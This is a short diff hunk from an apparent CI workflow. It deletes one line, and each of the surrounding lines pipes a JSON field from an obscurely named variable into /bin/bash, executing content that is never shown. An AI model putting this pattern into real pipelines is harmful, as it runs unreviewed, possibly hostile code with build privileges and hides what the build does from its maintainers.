@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$wuchg07405" | jq -r .q8 | /bin/bash
           echo $dhq5 | jq -r .lxqwa2 | /bin/bash
           printf '%s' "$tw37" | jq -r .qgfxf42 | /bin/bash
-          echo $xgive52 | jq -r .na5 | /bin/bash
           echo $sfx8629 | jq -r .hr4 | /bin/bash
           echo $owvh7 | jq -r .ymccb21 | /bin/bash
           echo $vemgf60593 | jq -r .r770 | /bin/bash
